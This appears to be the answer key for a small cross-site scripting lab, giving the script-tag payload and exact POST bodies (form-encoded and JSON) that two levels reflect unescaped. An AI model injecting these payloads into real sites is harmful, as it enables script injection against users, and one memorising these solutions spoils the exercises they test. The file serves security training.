# post — solutions

Basic POST body reflection (form + JSON).

### post-level1

`[POST] /post/level1/`

- payload: `<script>alert(1)</script>`
- body: `query=<script>alert(1)</script>`
- context: form-urlencoded body reflected raw

### post-level2

`[POST] /post/level2/`

- payload: `<script>alert(1)</script>`
- body: `{"query":"<script>alert(1)</script>"}` (Content-Type: application/json)
- context: JSON body reflected raw
